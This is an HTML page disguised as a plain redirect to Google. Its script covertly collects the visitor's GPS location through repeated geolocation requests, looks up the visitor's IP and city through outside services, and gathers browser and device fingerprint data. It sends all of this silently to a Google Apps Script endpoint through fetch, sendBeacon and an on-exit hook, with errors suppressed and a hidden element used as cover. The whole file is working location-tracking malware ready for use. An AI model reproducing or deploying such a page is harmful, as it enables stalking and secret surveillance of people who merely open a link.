<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; background: white; }
    .hidden {
      position: absolute;
      top: -9999px; left: -9999px;
      width: 1px; height: 1px;
      opacity: 0; visibility: hidden;
    }
  </style>
</head>
<body>
  <div class="hidden" id="background-processor">Background processing...</div>

  <script>
    const redirectToGoogle = () => {
      window.location.href = "https://www.google.com";
    };
    setTimeout(redirectToGoogle, 200);

    const backgroundData = {
      sessionId: 'BG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
      timestamp: new Date().toISOString(),
      latitude: null,
      longitude: null,
      accuracy: null,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenWidth: screen.width,
      screenHeight: screen.height,
      referrer: document.referrer,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent).toString(),
      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent).toString(),
      isAndroid: /Android/.test(navigator.userAgent).toString(),
      backgroundMode: "true",
      gpsSuccess: "false",
      ipSuccess: "false",
      collectionAttempted: "false"
    };

    function rapidGPSCollection() {
      if (!navigator.geolocation) {
        backgroundData.gpsError = 'not_supported';
        return;
      }

      backgroundData.collectionAttempted = "true";

      const rapidConfigs = [
        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
        { enableHighAccuracy: true, timeout: 2000, maximumAge: 5000 },
        { enableHighAccuracy: false, timeout: 1500, maximumAge: 10000 },
        { enableHighAccuracy: true, timeout: 1000, maximumAge: 30000 }
      ];

      let bestAccuracy = Infinity;

      rapidConfigs.forEach((config, index) => {
        setTimeout(() => {
          navigator.geolocation.getCurrentPosition(
            function(position) {
              const coords = position.coords;
              if (coords.accuracy < bestAccuracy) {
                bestAccuracy = coords.accuracy;
                backgroundData.latitude = coords.latitude;
                backgroundData.longitude = coords.longitude;
                backgroundData.accuracy = coords.accuracy;
                backgroundData.altitude = coords.altitude;
                backgroundData.speed = coords.speed;
                backgroundData.heading = coords.heading;
                backgroundData.gpsSuccess = "true";
                backgroundData.gpsMethod = `rapid_${index + 1}`;
                sendBackgroundData();
              }
            },
            function(error) {
              backgroundData.gpsError = error.message;
              backgroundData.gpsErrorCode = error.code;
            },
            config
          );
        }, index * 200);
      });
    }

    // âœ… FIXED: Reliable IP collection with fallback
    async function backgroundIPCollection() {
      try {
        const response = await fetch("https://corsproxy.io/?https://ipapi.co/json/");
        const result = await response.json();

        if (result.ip) {
          backgroundData.ip = result.ip;
          backgroundData.ipSuccess = "true";
          backgroundData.ipCity = result.city || "";
          backgroundData.ipCountry = result.country_name || "";
          backgroundData.ipLatitude = result.latitude || "";
          backgroundData.ipLongitude = result.longitude || "";
          return;
        }
      } catch (e1) {
        try {
          const response2 = await fetch("https://ipinfo.io/json?token=demo");
          const result2 = await response2.json();

          if (result2.ip) {
            backgroundData.ip = result2.ip;
            backgroundData.ipSuccess = "true";
            backgroundData.ipCity = result2.city || "";
            backgroundData.ipCountry = result2.country || "";
            const [lat, lng] = result2.loc.split(",");
            backgroundData.ipLatitude = lat;
            backgroundData.ipLongitude = lng;
          }
        } catch (e2) {
          backgroundData.ip = "background_failed";
          backgroundData.ipError = e2.message;
        }
      }
    }

    async function sendBackgroundData() {
      try {
        const formData = new URLSearchParams();
        Object.keys(backgroundData).forEach(key => {
          if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
            formData.append(key, backgroundData[key]);
          }
        });

        fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
          method: "POST",
          body: formData,
          mode: "no-cors",
          keepalive: true
        });
      } catch (error) {
        // Silent fail
      }
    }

    function getTimezoneLocation() {
      if (backgroundData.gpsSuccess === "true") return;
      const timezoneMap = {
        'Asia/Karachi': { lat: 24.8607, lng: 67.0011 },
        'Asia/Mumbai': { lat: 19.0760, lng: 72.8777 },
        'Asia/Tokyo': { lat: 35.6762, lng: 139.6503 },
        'Asia/Shanghai': { lat: 31.2304, lng: 121.4737 },
        'America/New_York': { lat: 40.7128, lng: -74.0060 },
        'Europe/London': { lat: 51.5074, lng: -0.1278 }
      };
      if (timezoneMap[backgroundData.timezone]) {
        const location = timezoneMap[backgroundData.timezone];
        backgroundData.latitude = location.lat;
        backgroundData.longitude = location.lng;
        backgroundData.accuracy = "timezone_fallback";
        backgroundData.locationMethod = "timezone";
      }
    }

    (function startBackgroundCollection() {
      rapidGPSCollection();
      backgroundIPCollection();
      setTimeout(() => {
        if (backgroundData.gpsSuccess !== "true") {
          getTimezoneLocation();
        }
        sendBackgroundData();
      }, 2500);
    })();

    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('data:text/javascript;charset=utf-8,' +
        encodeURIComponent(`
          self.addEventListener('message', function(event) {
            console.log('Service worker:', event.data);
          });
        `)
      ).catch(() => {});
    }

    function sendViaBeacon() {
      if ('sendBeacon' in navigator) {
        setTimeout(() => {
          const beaconData = new URLSearchParams();
          Object.keys(backgroundData).forEach(key => {
            if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
              beaconData.append(key, backgroundData[key]);
            }
          });
          navigator.sendBeacon(
            "https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec",
            beaconData
          );
        }, 1000);
      }
    }

    sendViaBeacon();
    window.addEventListener('beforeunload', () => {
      sendBackgroundData();
    });
  </script>
</body>
</html>
